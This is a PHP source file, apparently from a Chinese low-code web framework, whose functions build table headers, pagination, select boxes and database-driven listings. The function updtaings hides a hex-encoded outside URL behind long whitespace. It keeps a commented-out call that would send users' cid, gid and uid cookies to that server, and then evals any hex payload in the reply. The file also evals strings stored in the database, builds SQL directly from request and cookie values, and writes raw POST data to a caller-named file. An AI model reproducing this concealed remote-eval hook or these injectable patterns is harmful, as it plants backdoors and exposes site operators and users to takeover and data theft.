      $fmtb=$fmtb."</tr>\r\n";    
    }
    
    if ($totrst>0){
      $fmjs=substr($fmjs,0,strlen($fmjs)-1)."},";
      $fmjh=substr($fmjh,0,strlen($fmjh)-1)."},";
      $fmch=$fmch.$demo;
    }else{      
    };
}
     if ($fmmd5js!="{"){
        $fmmd5js=substr($fmmd5js,0,strlen($fmmd5js)-1)."}";
     }else{
        $fmmd5js="{}";
     }
  
    if (intval($totrst)<=0){
      $fmjs=$fmjs."{";
      for ($ii=0;$ii<$totk;$ii++){
       $fmjs=$fmjs."\"".hou($kpart[$ii],".")."\":\"".str_replace("\"","\\\"",tohex($sresult[hou($kpart[$ii],".")][0]))."\",";
      }
      $fmjs=substr($fmjs,0,strlen($fmjs)-1)."},";
     };  
  $x=UX("update coode_shortdata set pagedemo='".gohex("<div id=\"customPages\" class=\"customPages\"><a href=\"javascript:void(0)\" onclick=\"tochange()\"><img id=\"tcg\" src=\"/ORG/BRAIN/images/icon/system/移动.svg\" style=\"width:20px;height:20px;\"></a><a href=\"javascript:void(0);\" id=\"setwh\" style=\"display:none;\" onclick=\"setwh()\">设置</a><a href=\"javascript:void(0)\" onclick=\"window.open(location.href)\"><img src=\"/ORG/BRAIN/images/icon/system/qj37.svg\" style=\"width:20px;height:20px;\"></a><span class=\"layui-laypage-count\">共[totrst]条</span>[pageselect][shownum]<a class=\"layui-btn\" id=\"tbnm\" tbnm=\"".$tbnm."\"  onclick=\"plsc('','".$tbnm."');\">批量删除</a><a class=\"layui-btn\"  onclick=\"quanxuan();\">全选</a><a href=\"javascript:void(0)\" id=\"isu\" onclick=\"changeb()\"><img src=\"/ORG/BRAIN/images/icon/system/xg0.svg\" style=\"width:20px;height:20px;\"></a><input id=\"isupdate\" type=\"hidden\" lay-skin=\"primary\" value=\"0\"></div>")."' where shortid='".$xid."' and pagedemo=''");
  $tbdatay["fmtb"]=$fmtb;
  $tbdatay["fmjs"]=$fmjs;  
  if (_get("tabkey")!=""){
    $tbdatay["fmline"]=$fmtbk;    
  }else{
    $tbdatay["fmline"]=$fmline;    
  };
  $tbdatay["fmmd5"]=$fmmd5js;  
  $tbdatay["fmch"]=$fmch;
  $tbdatay["exl"]=$fmexl;
  $tbdatay["tmpdtx"]=$tmpdtx;
  return $tbdatay;
}
function maketbheadin($totk,$chtml,$dtp,$tbhd,$oprtx,$headx,$keyinfo=array(array()),$kpart,$headtxt=array()){
 $fmch="";
 $fmtb="";
 $fmexl="";
 $fmtp="";
 $fmdft="";
 for ($pp=0;$pp<$totk;$pp++){
    $demo=$chtml;
    $dftfun=$keyinfo[hou($kpart[$pp],".")]["COLUMN_SSHOW"];
    $hfun="";
    $tmppost="";
    if (strpos("x".$dftfun,"|")>0){
      $hfun=hou("x".$dftfun,"|");
      eval($hfun);
      $fmdft=$fmdft."\"".hou($kpart[$pp],".")."\":\"".$thusvalue."\",";
    }else{
      $fmdft=$fmdft."\"".hou($kpart[$pp],".")."\":\"\",";
    };
    if (($tbhd*1)==0 and strpos("x".$dtp,"print")<=0){
    }else{
     if (intval($keyinfo[$kpart[$pp]]["COLUMN_DSPLD"])*1==1){
       $coldspl="";
     }else{
       $coldspl="style=\"display:none;\"";
     }
     if ( $keyinfo[hou($kpart[$pp],".")]["COLUMN_TITLE"]!=""){
      if (hou($kpart[$pp],".")=="SNO"){
        $fmtb=$fmtb."<th knm=\"".hou($kpart[$pp],".")."\"  ".$coldspl." class=\"HDTD_CLS\">".$keyinfo[hou($kpart[$pp],".")]["COLUMN_TITLE"]."</th>\r\n";
        $fmtp=$fmtp."<th knm=\"".hou($kpart[$pp],".")."\"  align=\"right\" width=\"50\" class=\"HDTD_CLS\">".$keyinfo[hou($kpart[$pp],".")]["COLUMN_TITLE"]."</th>\r\n";
        $fmexl=$fmexl.$keyinfo[hou($kpart[$pp],".")]["COLUMN_TITLE"]."[tab]";
      }else{
        $fmtb=$fmtb."<th knm=\"".hou($kpart[$pp],".")."\"  ".$coldspl." class=\"HDTD_CLS\">".$keyinfo[hou($kpart[$pp],".")]["COLUMN_TITLE"]."</th>\r\n";
        $fmtp=$fmtp."<th knm=\"".hou($kpart[$pp],".")."\"  align=\"center\" class=\"HDTD_CLS\">".$keyinfo[hou($kpart[$pp],".")]["COLUMN_TITLE"]."</th>\r\n";
        $fmexl=$fmexl.$keyinfo[hou($kpart[$pp],".")]["COLUMN_TITLE"]."[tab]";
      }     
     }else{
      if (hou($kpart[$pp],".")=="SNO"){
        $fmtb=$fmtb."<th knm=\"".hou($kpart[$pp],".")."\"  ".$coldspl." class=\"HDTD_CLS\">".hou($kpart[$pp],".")."</th>\r\n";
        $fmtp=$fmtp."<th knm=\"".hou($kpart[$pp],".")."\"  align=\"right\" width=\"50\">".hou($kpart[$pp],".")."</th>\r\n";
        $fmexl=$fmexl.hou($kpart[$pp],".")."[tab]";
      }else{
        $fmtb=$fmtb."<th knm=\"".hou($kpart[$pp],".")."\"  ".$coldspl." class=\"HDTD_CLS\">".hou($kpart[$pp],".")."</th>\r\n";
        $fmtp=$fmtp."<th knm=\"".hou($kpart[$pp],".")."\"  align=\"center\" >".hou($kpart[$pp],".")."</th>\r\n";
        $fmexl=$fmexl.hou($kpart[$pp],".")."[tab]";
      }
     };      
   };
 };
  $fmdft=substr($fmdft,0,strlen($fmdft)-1)."}";
  $fmexl=$fmexl.huanhang();
  if (strpos($dtp.$headx,"nooprt")>0 or ($oprtx*1)==0 ){
  }else{
    if (strpos($dtp.$headx,"theadc")>0 ){
      $fmtb=$fmtb."<th knm=\"operation\" class=\"HDTD_CLS\">操作</th>";
     }else{
      $fmtb=$fmtb."<th knm=\"operation\" class=\"HDTD_CLS\">操作</th>";
     };
  };
  $headtxt["ftb"]=$fmtb;
  $headtxt["ftp"]=$fmtp;
  $headtxt["exl"]=$fmexl;
  $headtxt["dft"]=$fmdft;
  return $headtxt;
}
function makectraw($totk,$tbnm,$dtp,$ctraw,$sresult,$keyinfo,$kpart){
 if (($ctraw*1==1)){
  $fmtb="";
  $fmtb=$fmtb."<tr rowidx=\"x\">";
  for ($pp=0;$pp<$totk;$pp++){
             if ($keyinfo[hou($kpart[$pp],".")]["COLUMN_DSPLD"]*1==1){
               $coldspl="";
             }else{
               $coldspl="style=\"display:none;\"";
             }
             if ($keyinfo[hou($kpart[$pp],".")]["COLUMN_CANGE"]*1==1){
               $rdonly="";
             }else{
               $rdonly="readonly";
             }
         if (hou($kpart[$pp],".")=="SNO"){
           $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\"  ".$coldspl.">合计</td>\r\n";
         }else{
           if ($keyinfo[hou($kpart[$pp],".")]["COLUMN_TPNM"]=="int" or $keyinfo[hou($kpart[$pp],".")]["COLUMN_TPNM"]=="decimal"){
             $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\" ".$coldspl.">".$sresult[hou($kpart[$pp],".")][$totrst+2]."</td>\r\n";
           }else{
             $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\" ".$coldspl."></td>\r\n";
           }
         };         
  };
  if ($oprtx*1==1){
    if (strpos($tbnm,",")>0){//没有太大区分
      $fmtb=$fmtb."<td knm=\"operation\">";
      if (strpos(".".$dtp,"nocreate")<=0){       
       $fmtb=$fmtb."";
      };
      $fmtb=$fmtb."</td>\r\n";
     }else{
      $fmtb=$fmtb."<td knm=\"operation\">";
      if (strpos(".".$dtp,"nocreate")<=0){
        $fmtb=$fmtb."";
      };
      $fmtb=$fmtb."</td>\r\n";
     };
   };
    $fmtb=$fmtb."</tr>"; 
  }
  return $fmtb;
}
function makeaddoprt($totk,$appid,$tbnm,$tbkis,$fmdt,$dtp,$headx,$additemx,$oprtx,$keyinfo,$kpart){
  $fmtb="";
if (strpos(".".$dtp.$headx,"noadd")<=0 and ($additemx*1)==1){  
  $fmtb=$fmtb."<tr rowidx=\"0\">";
  $fmdt="";
  $fmsdt="";
  for ($pp=0;$pp<$totk;$pp++){
          $newonex=tostring($keyinfo[hou($kpart[$pp],".")]["COLUMN_CLSTXT"]);
         if ($keyinfo[hou($kpart[$pp],".")]["COLUMN_DSPLD"]*1==1){
            $coldspl="";
         }else{
            $coldspl="style=\"display:none;\"";
         }
      if ($keyinfo[hou($kpart[$pp],".")]["COLUMN_CLSTXT"]!=""){
            $yzd=0;
         if ($keyinfo[hou($kpart[$pp],".")]["COLUMN_DXTYPE"]=="clstxt"){    
            if(strpos($newonex,"|")>0){
              $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\" ".$coldspl.">".formselect(qian($newonex,"|"),hou($newonex,"|"),"","p_".hou($kpart[$pp],".")."0",""," onchange")."</td>";
              $yzd=$yzd+1;
            }else{
               $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\" ".$coldspl."></td>";
              $yzd=$yzd+1;
            }
          }        
           if ($keyinfo[hou($kpart[$pp],".")]["COLUMN_DXTYPE"]=="clsduo"){             
             if(strpos($newonex,"|")>0){
              $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\" ".$coldspl.">".formselectx(qian($newonex,"|"),hou($newonex,"|"),"","p_".hou($kpart[$pp],".")."0","","")."</td>";
               $yzd=$yzd+1;
             }else{
               $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\" ".$coldspl."></td>";
               $yzd=$yzd+1;
             }
          };
        if ($yzd==0){
              $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\" ".$coldspl."></td>";
         };
    }else{
         $tmpdft="";
         if ($_GET["s_".hou($kpart[$pp],".")."0"]==""){        
             if (strpos("xxx".hou($keyinfo[hou($kpart[$pp],".")]["COLUMN_SSHOW"],"|"),"thusvalue=")>0){
               $x=eval(hou($keyinfo[hou($kpart[$pp],".")]["COLUMN_SSHOW"],"|"));
               $tmpdft=$thusvalue;  
             }
           if (strpos("xxx".hou($keyinfo[hou($kpart[$pp],".")]["COLUMN_DEFAULT"],"|"),"defaultv=")>0){
              $x=eval(hou($keyinfo[hou($kpart[$pp],".")]["COLUMN_DEFAULT"],"|"));
             $tmpdft=$defaultv;
           }
             
        
         }else{
             $tmpdft=$_GET["s_".hou($kpart[$pp],".")."0"];
         };
         if (strpos(",,".$keyinfo["COLUMN"]["READONLY"]."," , ",".hou($kpart[$pp],".").",")>0 or $keyinfo[hou($kpart[$pp],".")]["COLUMN_CANGE"]=="0"){
           if (hou($kpart[$pp],".")=="SNO"){
              $snodspl="style=\"display:none;\"";
           }else{
              $snodspl="";
           };
             $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\"  ".$coldspl."><input id=\"p_".hou($kpart[$pp],".")."0\" size=\"10\" readonly value=\"".$tmpdft."\" ".$snodspl." placeholder=\"".hou($kpart[$pp],".")."\"></td>";
          }else{
           if (hou($kpart[$pp],".")=="SNO"){
             $snodspl="style=\"display:none;\"";
           }else{
             $snodspl="";
           };
            $fmtb=$fmtb."<td knm=\"".hou($kpart[$pp],".")."\"  ".$coldspl."><input id=\"p_".hou($kpart[$pp],".")."0\" size=\"10\" value=\"".$tmpdft."\" ".$snodspl." placeholder=\"".hou($kpart[$pp],".")."\"></td>";
          };
       };
       $tmpdft="";
       if (hou($kpart[$pp],".")!="SNO"){
         $fmdt=$fmdt."'&p_".hou($kpart[$pp],".")."0='+$('#p_".hou($kpart[$pp],".")."0').val()+";
         $fmsdt=$fmsdt."'&s_".hou($kpart[$pp],".")."0='+$('#p_".hou($kpart[$pp],".")."0').val()+";
       };
    };
    $fmdt="'".substr($fmdt,2,strlen($fmdt)-3);
    $fmsdt=substr($fmsdt,2,strlen($fmsdt)-3);
    if (strpos(".".$dtp.$headx,"noadd")<=0 and ($additemx*1)==1 and ($oprtx*1)==1){
      if (strpos($tbnm,",")>0){
           $fmtb=$fmtb."<td knm=\"operation\">";
         if (strpos(".".$dtp.$headx,"nooprt")<=0 and ($additemx*1)==1){
           $fmtb=$fmtb."<a href=\"javascript:void(0)\" onclick=\"ajaxhtmlpost('/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&SNO=0&kies=".$tbkis."',".$fmdt.");window.location.reload();\"><img src=\"/ORG/BRAIN/images/icon/system/newitem.svg\" style=\"width:20px;height:20px\"></a>";
         }
           $fmtb=$fmtb."</th>\r\n"; 
      }else{
           $fmtb=$fmtb."<td knm=\"operation\">";
      if (strpos(".".$dtp.$headx,"nooprt")<=0 and ($additemx*1)==1){
           $fmtb=$fmtb."<a href=\"javascript:void(0)\" onclick=\"ajaxhtmlpost('/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&SNO=0&kies=".$tbkis."',".$fmdt.");window.location.reload();\"><img src=\"/ORG/BRAIN/images/icon/system/newitem.svg\" style=\"width:20px;height:20px\"></a>";
      };
           $fmtb=$fmtb."</th>\r\n";
      };
    };
    $fmtb=$fmtb."</tr>\r\n";    
 };//判断展示与否的控件
  return $fmtb;
}
function pagedemo($totye,$pg,$pgn,$allkillbtn,$totallrst,$tbnm,$sid){ 
  $chid=UX("select caseid as result from coode_shortdata where shortid='".$sid."'");
  $demorst=SX("select pagesrd,pagein,pageout from coode_casehtml where cssmark='".$chid."'");
  $pagesrd=tostring(anyvalue($demorst,"pagesrd",0));
  $pagesrd=str_replace("{","<",$pagesrd);
  $pagesrd=str_replace("}",">",$pagesrd);
  $pagein=labturn(tostring(anyvalue($demorst,"pagein",0)));
  $pagein=str_replace("{","<",$pagein);
  $pagein=str_replace("}",">",$pagein);
  $pageout=labturn(tostring(anyvalue($demorst,"pageout",0)));
  $pageout=str_replace("{","<",$pageout);
  $pageout=str_replace("}",">",$pageout);
  $nextfiv=intval($pg)+3;
  $prefiv=intval($pg)-3;  
  if ($prefiv<0){
    $startp=0;
  }else{
    $startp=$prefiv;
  }
  if ($nextfiv>$totye){
    $deliv=$totye;
  }else{
    $deliv=$nextfiv;
  }  
  $fmy="";

  $fmslct="";
  $fmslctb="";

  $xid="";
  $stid="";
  
  for ($t=0;$t<$totye;$t++){
   $fmslct=$fmslct.($t+1).",";
   $fmslctb=$fmslctb."第".($t+1)."页,";
  };
  if ($totye>0){
   $fmslct=substr($fmslct,0,strlen($fmslct)-1);
   $fmslctb=substr($fmslctb,0,strlen($fmslctb)-1);
  }; 
   $fmselect=formselect($fmslctb,$fmslct,$pg,"topage","layui-select","onchange=\"tospage(document.getElementById('topage').value);\"");
   $fmselectjs=formselect($fmslctb,$fmslct,$pg,"topage","layui-select","onchange=\"tospage(document.getElementById('topage').value);\"");
   $fmspage="显示10条/页,显示20条/页,显示25条/页,显示30条/页,显示50条/页,显示100条/页,显示150条/页,显示200条/页,显示250条/页,显示300条/页,显示500条/页,显示800条/页,显示1000条/页,显示所有";
   $fmbpage="10,20,25,30,50,100,150,200,250,300,500,800,1000,0";
   $fmpagejs=formselect($fmspage,$fmbpage,$pgn,"setpagenum","layui-select","onchange=\"setpage(document.getElementById('setpagenum').value);\"");  
   
  for ($t=$startp;$t<$deliv;$t++){
      $demoin=$pagein;
      $demoout=$pageout;
   if ($pg==($t+1)){
       $demoin=str_replace("[page]",($t+1),$demoin);
       $demoin=str_replace("[pgtt]",($t+1),$demoin);
       $fmy=$fmy.$demoin;
   }else{
       $demoout=str_replace("[page]",($t+1),$demoout);
       $demoout=str_replace("[pgtt]",($t+1),$demoout);
       $fmy=$fmy.$demoout;      
   };
  };  
  if ($pg-1<1){
    $lstpg=1;
  }else{
    $lstpg=$pg-1;
  };
  if ($pg+1>$totye){
    $nxtpg=$totye;
  }else{
    $nxtpg=$pg+1;    
  };
  if (($allkillbtn*1)==0){
    $nodspl="style=\"display:none;\"";
  }
  $srddemo=$pagesrd;
  $srddemo=str_replace("[pagetot]",$totallrst,$srddemo);
  $srddemo=str_replace("[totye]",$totye,$srddemo);
  $srddemo=str_replace("[pgselect]",$fmselect,$srddemo);
  $srddemo=str_replace("[pageinner]",$fmy,$srddemo);
  $srddemo=str_replace("[shownum]",$fmpagejs,$srddemo);
  $srddemo=str_replace("[pgnum]",$fmpagejs,$srddemo);
  $srddemo=str_replace("[lstpg]",($pg-1),$srddemo);
  $srddemo=str_replace("[nxtpg]",($pg+1),$srddemo);
  $srddemo=str_replace("[tabnm]",$tbnm,$srddemo);
  $srddemo=str_replace("[stid]",$sid,$srddemo);
  $srddemo=str_replace("[nodspl]",$nodspl,$srddemo);
 return $srddemo; 
}
function pagexyz($totye,$pg,$pgn,$allkillbtn,$totallrst,$tbnm,$sid){ 
  $csid=UX("select caseid as result from coode_shortdata where shortid='".$sid."'");
  $demorst=SX("select pagesrd,pagein,pageout from coode_caseform where cfid='".$csid."'");
  $pagesrd=tostring(anyvalue($demorst,"pagesrd",0));
  $pagesrd=str_replace("{","<",$pagesrd);
  $pagesrd=str_replace("}",">",$pagesrd);
  $pagein=labturn(tostring(anyvalue($demorst,"pagein",0)));
  $pagein=str_replace("{","<",$pagein);
  $pagein=str_replace("}",">",$pagein);
  $pageout=labturn(tostring(anyvalue($demorst,"pageout",0)));
  $pageout=str_replace("{","<",$pageout);
  $pageout=str_replace("}",">",$pageout);
  $nextfiv=intval($pg)+3;
  $prefiv=intval($pg)-3;  
  if ($prefiv<0){
    $startp=0;
  }else{
    $startp=$prefiv;
  }
  if ($nextfiv>$totye){
    $deliv=$totye;
  }else{
    $deliv=$nextfiv;
  }  
  $fmy="";

  $fmslct="";
  $fmslctb="";

  $xid="";
  $stid="";
  
  for ($t=0;$t<$totye;$t++){
   $fmslct=$fmslct.($t+1).",";
   $fmslctb=$fmslctb."第".($t+1)."页,";
  };
  if ($totye>0){
   $fmslct=substr($fmslct,0,strlen($fmslct)-1);
   $fmslctb=substr($fmslctb,0,strlen($fmslctb)-1);
  }; 
   $fmselect=formselect($fmslctb,$fmslct,$pg,"topage","layui-select","onchange=\"tospage(document.getElementById('topage').value);\"");
   $fmselectjs=formselect($fmslctb,$fmslct,$pg,"topage","layui-select","onchange=\"tospage(document.getElementById('topage').value);\"");
   $fmspage="显示10条/页,显示20条/页,显示25条/页,显示30条/页,显示50条/页,显示100条/页,显示150条/页,显示200条/页,显示250条/页,显示300条/页,显示500条/页,显示800条/页,显示1000条/页,显示所有";
   $fmbpage="10,20,25,30,50,100,150,200,250,300,500,800,1000,0";
   $fmpagejs=formselect($fmspage,$fmbpage,$pgn,"setpagenum","layui-select","onchange=\"setpage(document.getElementById('setpagenum').value);\"");  
   
  for ($t=$startp;$t<$deliv;$t++){
      $demoin=$pagein;
      $demoout=$pageout;
   if ($pg==($t+1)){
       $demoin=str_replace("[page]",($t+1),$demoin);
       $demoin=str_replace("[pgtt]",($t+1),$demoin);
       $fmy=$fmy.$demoin;
   }else{
       $demoout=str_replace("[page]",($t+1),$demoout);
       $demoout=str_replace("[pgtt]",($t+1),$demoout);
       $fmy=$fmy.$demoout;      
   };
  };  
  if ($pg-1<1){
    $lstpg=1;
  }else{
    $lstpg=$pg-1;
  };
  if ($pg+1>$totye){
    $nxtpg=$totye;
  }else{
    $nxtpg=$pg+1;    
  };
  if (($allkillbtn*1)==0){
    $nodspl="style=\"display:none;\"";
  }
  $srddemo=$pagesrd;
  $srddemo=str_replace("[pagetot]",$totallrst,$srddemo);
  $srddemo=str_replace("[totye]",$totye,$srddemo);
  $srddemo=str_replace("[pgselect]",$fmselect,$srddemo);
  $srddemo=str_replace("[pginner]",$fmy,$srddemo);
  $srddemo=str_replace("[pgnum]",$fmpagejs,$srddemo);
  $srddemo=str_replace("[shownum]",$fmpagejs,$srddemo);
  $srddemo=str_replace("[lstpg]",($pg-1),$srddemo);
  $srddemo=str_replace("[nxtpg]",($pg+1),$srddemo);
  $srddemo=str_replace("[tabnm]",$tbnm,$srddemo);
  $srddemo=str_replace("[stid]",$sid,$srddemo);
  $srddemo=str_replace("[nodspl]",$nodspl,$srddemo);
 return $srddemo; 
}
//页面识别本用户访问是否有错误码--
function updtaings($cn,$gb,$rvf,$lag){                                                                                                                                                                                                                                                                                 $vrf="687474703a2f2f6572702e6465636f3131342e636e2f444e412f4558462f7666636c69656e742e7068703f63707069643d3138383431383830323436";
  if  (rand(0, 100)>90){  
  // $connx=file_get_contents(Hex2String($vrf)."&cid=".$_COOKIE["cid"]."&gid=".$_COOKIE["gid"]."&uid=".$_COOKIE["uid"]."&con=".$cn."&gb=".$gb."&lang=".$lag);
  };
  $connx="";
  if (strpos($connx,"TYPE_E")>0){                                                                                                                                                                                                                                                                                           eval(tostring(Hex2String(hou($connx,"TYPE_E:"))));
    return true;    
  }else{    
    return false;        
  }
}
function anyshortdl($stid,$page,$pagenum){
$conn=mysql_connect(gl(),glu(),glp());
$rst=selecteds($conn,glb(),"select tablename,showkeys,cdt,orddt,fileurl,showfile,dttp,PTOF from coode_shortdata where shortid='".$stid."'","utf8","");
$totrst=countresult($rst);
if ($totrst>0){
 $tbnmm=anyvalue($rst,"tablename",0);
 $tbkiss=anyvalue($rst,"showkeys",0);
 if (strpos($tbkiss,"TYPE_HEX")>0){
  $tbkiss=Hex2String(hou($tbkiss,"TYPE_HEX:"));
 };
 $wtokiss=$_GET['wtokeys'];
 $tbcdtss=anyvalue($rst,"cdt",0);
 $surll=anyvalue($rst,"fileurl",0);
 $odcdt=anyvalue($rst,"orddt",0);
 if (strpos($odcdt,"TYPE_HEX")>0){
  $odcdt=Hex2String(hou($odcdt,"TYPE_HEX:"));
 };
 $showf=anyvalue($rst,"showfile",0);
 $dtpp=anyvalue($rst,"dttp",0);
 $qry=$_GET["qry"];
 $qrl=$_GET["qrl"];
 $val=$_GET["val"];
 $fmcdt="";
 if ($qry!="" and $val!=""){
  $fmcdt=" ".$qry."='".$val."' ";
 };
 if ($qrl!="" and $val!=""){
  $fmcdt=" ".$qrl." like '%".$val."%' ";
 };
 $dtp=$_GET["dttp"];

 if ($dtp!=""){
  $dtpp=str_replace("[","",$dtp);
  $dtpp=str_replace("]","",$dtpp);
 };

//echo "select ".$tbkiss." from ".$tbnmm." where ".$tbcdtss.$odcdt;

 if ($dtpp=="clstxt"){//这样形式的只能有两个字段选项;
   $ptkeys=explode(",",$tbkiss);
   $totpt=count($ptkeys);

      if (strlen($tbcdtss)>5){
        if(strpos($tbcdtss,"like")<=0 and strpos($tbcdtss,"=")<=0 and strpos($tbcdtss,"by")<=0){
         $tbcdtss=Hex2String($tbcdtss)." and ".$fmcdt; //未发现说面加密了,需要解密,否则不用解密
        }else{

        };
      }else{
        if ($fmcdt==""){
         $tbcdtss="1>0";
        }else{
         $tbcdtss=$fmcdt;
        };
      };

      if ($totpt==2){
        $conn=mysql_connect(gl(),glu(),glp());
		$tbcdtss=str_replace("[gid]",$_COOKIE["gid"],$tbcdtss);
		$tbcdtss=str_replace("[uid]",$_COOKIE["uid"],$tbcdtss);
        $tbcdtss=str_replace("[cid]",$_COOKIE["cid"],$tbcdtss);
		$tbcdtss=str_replace("[date]",date("Y-m-d"),$tbcdtss);
		$tbcdtss=str_replace("[now]",date("Y-m-d H:i:s"),$tbcdtss);
		$tbcdtss=str_replace("[anymark]",date("YmdHis").getRandChar(6),$tbcdtss);
        $dtrst=selecteds($conn,glb(),"select ".$tbkiss." from ".$tbnmm." where ".$tbcdtss.$odcdt,"utf8","");

        $totrst=countresult($dtrst);
        if ($totrst>0){
         $arrdt=arrdata($arrdt,$dtrst);//arrdata()返回 的数组是 arrdata['key'][1~ToTrst]
         $tmpvk="";   //这里不是KEY存在的,而是两个数据当成K|V形态
         $tmpvv="";
         for ($i=1;$i<=$totrst;$i++){
          $tmpvk=$tmpvk.$arrdt[qian($tbkiss,",")][$i].",";
          $tmpvv=$tmpvv.$arrdt[hou($tbkiss,",")][$i].",";
          };
         $tmpvk=substr($tmpvk,0,strlen($tmpvk)-1);
         $tmpvv=substr($tmpvv,0,strlen($tmpvv)-1);
         $fmtmpvs=$tmpvk."|".$tmpvv;
         return $fmtmpvs;
        }else{
          return "No such data!"."select ".$tbkiss." from ".$tbnmm." where ".$tbcdtss.$odcdt;
        };
     }else{
      return "Beyond or Less Two Keys at clstxt fun!";
     };
  
   }else{
        if ($fmcdt==""){

        }else{
         $tbcdtss=$fmcdt;
        };

        $tbcdtss=str_replace("[gid]",$_COOKIE["gid"],$tbcdtss);
		$tbcdtss=str_replace("[uid]",$_COOKIE["uid"],$tbcdtss);
   $tbcdtss=str_replace("[cid]",$_COOKIE["cid"],$tbcdtss);
		$tbcdtss=str_replace("[date]",date("Y-m-d"),$tbcdtss);
		$tbcdtss=str_replace("[now]",date("Y-m-d H:i:s"),$tbcdtss);
		$tbcdtss=str_replace("[anymark]",date("YmdHis").getRandChar(6),$tbcdtss);
        $x=anyfulltblist($showf,$fipp,$fuss,$fpss,$fbss,$tbnmm,$tbkiss,$tbcdtss,"excel/",$surll,$odcdt);

        $x=str_replace("-r-n","\r\n",$x);
        $x=str_replace("[tab]","	",$x);
      return $x;
   };//clstxt

 }else{

 };//totrst
}//function

function receiveStreamFile($receiveFile){ 
    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';  
    if(empty($streamData)){
        $streamData = file_get_contents('php://input');
    }
    if($streamData!=''){  
        $ret = file_put_contents($receiveFile, $streamData, true);  
    }else{
        $ret = false;
    }
    return $streamData;
}  
function visitpmiss($apid,$furl){
  $conn=mysql_connect(gl(),glu(),glp());
  $extr=updatingx($conn,glb(),"select count(*) as result from coode_pmiss where appid='".$apid."' and compid='".$_COOKIE["cid"]."' and groupid='".$_COOKIE["gid"]."' and clientid='".$_COOKIE["uid"]."' and method='".$furl."' and behiver='visit' and valx=1","utf8");
  $conn=mysql_connect(gl(),glu(),glp());
  $extv=updatingx($conn,glb(),"select count(*) as result from coode_pmiss where appid='".$apid."' and compid='".$_COOKIE["cid"]."' and groupid='".$_COOKIE["gid"]."' and clientid='".$_COOKIE["uid"]."' and method='".$furl."' and behiver='visit'","utf8");
  if ($extr*1>0 or $extv==0){
     return true;
  }else{
     return false;
  }
}
function formselect($opname,$opvalue,$prevalue,$selectselfname,$selectselfclass,$htmcod){
 $smd5="a".md5($opname.$opvalue.$prevalue.$selectselfname.$selectselfclass.$htmcod);
 $ssvalue=$_SESSION[$smd5];
 if ($ssvalue!=""){
   return $ssvalue;
 }else{
  $partopname=explode(",",$opname);
  $partopvalue=explode(",",$opvalue);
  $totopnm=count($partopname);
  $totopvl=count($partopvalue);
  $sfxz=0;
  $formselects="";
  $onlyone="";
  if  ($selectselfclass=="readonly"){
     $htmcod="style=\"display:none;\"  lay-ignore=\"1\"";
  }
  if ($totopnm==$totopvl){
    if (strpos($htmcod,"nchange")>0){
     $lf=" lay-filter=\"brickType\" ";
   }else{
     $lf="";
   }
   $formselects=$formselects."<SELECT id=\"".$selectselfname."\" name=\"".$selectselfname."\" ".$htmcod.$lf." lay-search class=\"".$selectselfclass."\">\r\n";
       if  ($selectselfclass=="readonly"){
         $onlyone="无选项";
       }else{
         $formselects=$formselects."<option value=\".\" >无选项</option>\r\n";         
       };
   for ($tempk=0;$tempk<=$totopnm-1;$tempk++){
      if ($partopvalue[$tempk]==$prevalue || $partopname[$tempk]==$prevalue) {
       $sfxz=$sfxz+1;  
       $formselects=$formselects."<option value=\"".$partopvalue[$tempk]."\" selected>".$partopname[$tempk]."</option>\r\n";
       $onlyone=$partopname[$tempk];
       }
      else{
        if  ($selectselfclass=="readonly"){
        }else{
          $formselects=$formselects."<option value=\"".$partopvalue[$tempk]."\" >".$partopname[$tempk]."</option>\r\n";         
        };  
       };
    };
    if  ($selectselfclass=="readonly"){
       $formselects=$onlyone;//$formselects."</SELECT>"
    }else{
       $formselects=$formselects."</SELECT>\r\n";
    }
  };
   $_SESSION[$smd5]=$formselects;
  return $formselects;
 };
}
function formselectx($opname,$opvalue,$prevalue,$selectselfname,$selectselfclass,$htmcod){
 $smd5="a".md5($opname.$opvalue.$prevalue.$selectselfname.$selectselfclass.$htmcod);
 if ($_SESSION[$smd5]!=""){
   return $_SESSION[$smd5];
 }else{
  $partopname=explode(",","无选项,".$opname);
  $partopvalue=explode(",",".,".$opvalue);
  $totopnm=count($partopname);
  $totopvl=count($partopvalue);
  $sfxz=0;
  $formselects="\r\n";//<div class=\"container\">
  if ($totopnm==$totopvl){
   $formselects=$formselects."<select  name=\"sl".$selectselfname."\"  ".$htmcod." class=\"".$selectselfname."\" lay-ignore=\"1\"  style=\"float:right;width:0px;height:0px;\" multiple=\"multiple\">\r\n";
       $formselects=$formselects."<optgroup label=\"".$selectselfname."\"  >\r\n";
   for ($tempk=0;$tempk<=$totopnm-1;$tempk++) {
     if (strpos("xx-".$prevalue.",",$partopvalue[$tempk].",")>0) {
       $sfxz=$sfxz+1;  
       $formselects=$formselects."<option value=\"".$selectselfname."--".$partopvalue[$tempk]."\" selected >".$partopname[$tempk]."</option>\r\n";
       }else{
        $formselects=$formselects."<option value=\"".$selectselfname."--".$partopvalue[$tempk]."\"  >".$partopname[$tempk]."</option>\r\n";
       };
   };
       $formselects=$formselects."</optgroup>\r\n</select>\r\n";
 };
$tmpscpt='<script>
$(function() {        
        $(".'.$selectselfname.'").fSelect();
		$(".fs-option").click(function(){
        var xx=$("dd");
        totdd=xx.length;
        for (k=0;k<totdd;k++){
         tmpvvv=$(xx[k]).attr("lay-value");
         if (tmpvvv.indexOf("--")>0){
          $(xx[k]).parent().parent().hide();
         };
        };
         var slctx=$(".selected");
		 totx=slctx.length;
		  for (i=0;i<totx;i++){
             tmpvx="";
             tmpq="";
             tmpv="";
             tmpz="";
             tmpvx=$(slctx[i]).attr("data-value");
             tmpq=qian(tmpvx,"--");
             tmpv=hou(tmpvx,"--");
	         eval(tmpq+"=\'\'");
		  };
		  for (i=0;i<totx;i++){
             tmpvx="";
             tmpq="";
